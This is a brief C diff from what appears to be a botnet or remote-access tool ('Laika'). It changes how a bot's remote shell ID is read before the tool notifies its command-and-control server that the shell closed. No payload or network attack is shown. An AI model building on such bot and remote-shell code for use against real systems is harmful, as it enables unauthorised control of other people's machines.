@@ -19,7 +19,7 @@ struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows,
 }
 
 void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
-    uint32_t id = laikaB_getShellID(bot, shell);
+    uint32_t id = shell->id;
 
     /* tell cnc shell is closed */
     laikaS_startOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
